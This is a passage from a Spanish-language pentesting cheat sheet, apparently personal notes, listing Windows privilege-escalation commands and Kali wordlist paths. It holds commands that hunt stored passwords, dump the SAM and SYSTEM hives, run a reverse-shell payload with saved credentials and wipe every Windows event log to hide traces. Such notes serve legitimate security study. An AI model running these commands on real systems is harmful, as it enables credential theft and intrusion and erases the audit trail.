netsh advfirewall firewall add rule name="Allow MyApp" dir=in action=allow program="C:\path\to\myapp.exe" enable=yes #Permitir aplicación
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80 #Permitir porgrama a traves del firewall
```

### **Servicios y puertos**
```Powershell
netstat -ano #Muestra conexiones de red y puertos en uso.
ss -tn #Alternativa a netstat
tasklist /v #Muestra la lista de procesos y detalles en ejecución.
tasklist /svc #Muestra todos los procesos y servicios asociados en ejecución.
net start #Lista los servicios en ejecución.
net start <service> #Inicia un servicio
schtasks #Modificar tareas programadas
schtasks /query /fo LIST #Lista todas las tareas programadas
sc query #Consulta el estado de todos los servicios
sc query <service> #Consulta el estado de un servicio
sc qc <service> #Muestra detalles de configuración del servicio
sc start <service> #Arranca un servicio
```

### **Permisos y binarios**
```Powershell
icacls <ruta_directorio> #Comprueba los permisos de un archivo o directorio
cacls "C:\Program Files\Unquoted Path Service" #Para versiones mas antiguas de windows
cmdkey /list #Revisar credenciales Administrador de credenciales de Windows
runas /savecred /user:admin C:\PrivEsc\reverse.exe #Ejecutar payload con credenciales Administrador de credenciales
runas /user:admin cmd.exe #Ejecuta cmd con otro usuario con las credenciales
dir /a-r-d /s /b #Muestra todos los archivos con permisos de escritura
dir C:\*.txt /S /P #Lista todos los archivos.txt y subdirectorios
where /R C:\ *.txt #Lista todos los archivos .txt a partir del directorio C:\
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #Listar permisos de directorio y archivos con accesschk de sysinternal
findstr /spin "password" *.* #Busca la palabra passwd dentro de todos los archivos
findstr /si password *.xml *.ini #Busca arhcivos con el contenido de password
winPEAS.exe quiet filesinfo userinfo #Listar info usuarios
winPEAS.exe quiet searchfast filesinfo #Listar info archivos importantes
#Ubicación fichero SAM y SYSTEM
C:\Windows\System32\config\SAM #Revisar fichero SAM
C:\Windows\System32\config\SYSTEM #Revisar fichero SYSTEM
#Backup SAM y SYSTEM
C:\Windows\Repair
C:\Windows\System32\config\RegBack
#Desencriptar SAMY y SYSTEM con pwdump.py o secretsdump.py
#Obtener SAM y SYSTEM para persistencia siendo Administrador
reg save HKLM\SAM SAM.backup
reg save HKLM\SYSTEM SYSTEM.backup
```

### **Registros de windows**
```Powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #Revisar programa que inicia windows al arrancar
reg query HKLM /f password /t REG_SZ /s #Buscar contraseñas en los registros
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" #Buscar credenciales inicio de sesión
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated #Revisar privilegios ejecutable MSI HKCU 0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated #Revisar privilegios ejecutable MSI HKLM 0x1
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s #Credenciales Putty
```

### **Autenticación y detalles de sesion**
```Powershell
set #Muestra las variables del entorno
klist #Muestra todos los tickets activos de kerberos
klist sessions #Muestra todas las sesiones de inicio de sesion activas
klist tgt #Muestra toda la información acerca de TGT de Kerberos
```

### **Comandos Metasploit Windows**
```Powershell
sysinfo #Información del sistema
getuid #Identificación de usuarios
getpid #Identificación de procesos
shell #Acceso a la shell del sistema
hashdump #Obtención de hashes
migrate M#igrar a otro proceso
```

### **Binarios buscar vulnerabilidades**
[[1- Windows-Exploit-Suggester]]
[[2- WinPEAS]]
[[3- Seatbelt]]
[[4- PrivescCheck]]
[[5- PowerSploit]]
[[6- Rogue Potato]]

### **Binario revisar permisos**
[[AccesChk]]
```Bash
accesschk.exe -uwqv <usuario> <directorio> #Revisar permisos usuario
accesschk -wu usuario C:\ #Mostrar archivos con escritura
```

### **Binario PrivescCheck**
```
. .\\PrivescCheck.ps1; Invoke-PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### **Comandos Powershell**
```Powershell
powershell -ep bypass #Ejecutar comandos powershell desde cmd
#Nombre del sistema y version
$env:COMPUTERNAME
(Get-CimInstance Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version
#Arquitectura del sistema
(Get-CimInstance Win32_OperatingSystem).OSArchitecture
#Información del Hardware
Get-CimInstance Win32_ComputerSystem
Get-CimInstance Win32_Processor
#Listar usuarios
Get-LocalUser
#Listar grupos
Get-LocalGroup
#Listar conexiones activas
Get-NetTCPConnection
#Listar interfaces de red
Get-NetAdapter
#Información del sistema
Get-Computerinfo
#Listar procesos en ejecución
Get-Process
#Listar servicios en ejecución
Get-Service
#Listar acceso y permisos de un servicio
Get-Service -Name "zerotieronservice" | Get-Acl | Select-Object -ExpandProperty Access
#Arrancar servicio
Start-Service -Name "zerotieroneservice"
#Parar servicio
Stop-Service -Name "zerotieroneservice"
#Listar puertos abiertos y procesos asociados
Get-NetTCPConnection -State Listen
#Revisar eventos del sistema
Get-EventLog -LogName System
#Listar binarios y rutas
Get-Command
#Listar configuración de red
Get-NetIPConfiguration
#Listar acceso y permisos de un servicio
Get-Service -Name "zerotieronservice" | Get-Acl | Select-Object -ExpandProperty Access
#Listar permisos de un archivo o directorio
Get-Acl -Path "C:\ruta_directorio" | Format-List
#Listar y manipular permisos de archivos y directorios
icacls "C:\ruta\a\tu\archivo.txt"
#Para versiones mas antiguas de windows
cacls "C:\Program Files\Unquoted Path Service"
#Listar tareas
Get-ScheduledTask | ft TaskName, TaskPath, State, NextRunTime 
#Similar a type
Get-Content 
#Listar permisos de un archivo o directorio
Get-Acl -Path "C:\ruta_directorio" | Format-List
#Similar a locate
Get-ChildItem -Path C:\ -Recurse -Filter *.txt 
```

### **Eliminar huellas**
```Powershell
wevtutil el #Listar todos los registros de eventos
wevtutil cl <LogName> #Borrar un registros especifico
wevtutil cl Application #Borrar registro de aplicaciones
FOR /F "tokens=*" %G IN ('wevtutil el') DO wevtutil cl "%G" #Borrar todos los registros
```


# Entorno virtual (venv)
## **Configurar entorno virtual**
```Bash
python3 -m venv venv
source venv/bin/activate
```

## **Añadir al path**
```Bash
export PATH="$PATH:/opt/impacket"
source ~~/.zshrc # Cargamos la configuración
```

## **Activar entorno virtual**
```Bash
source path/to/configure/venv/bin/activate
```

## **Desactivar entorno virtual**
```Bash
deactivate
```

## **Comprobar si se ejecuta entorno virtual**
```Bash
echo $VIRTUAL_ENV
```

# Ocultar prueba pentesting
```
kali-undercover
```

# Diccionarios
## **Diccionario Fuzzing Web**
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
/usr/share/dirb/wordlists/common.txt
```

## **Diccionario enumeración Usuarios**
```
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## **Diccionarios Contraseñas**
```
/usr/share/wordlists/rockyou.txt
```

## **Diccionarios Enumeración general**
```
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

## **Diccionarios ataque web**
```
/usr/share/fuzzdb/attack-payloads/sql-injection/detect/GenericBlind.txt
/usr/share/fuzzdb/attack-payloads/xss/xss-rsnake.txt
```

## **Diccionario Subdominios**
```
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

## **Diccionarios recuperación contraseñas**
```
/usr/share/john/password.lst
```

# Repositorio SecLists
```
https://github.com/danielmiessler/SecLists
```




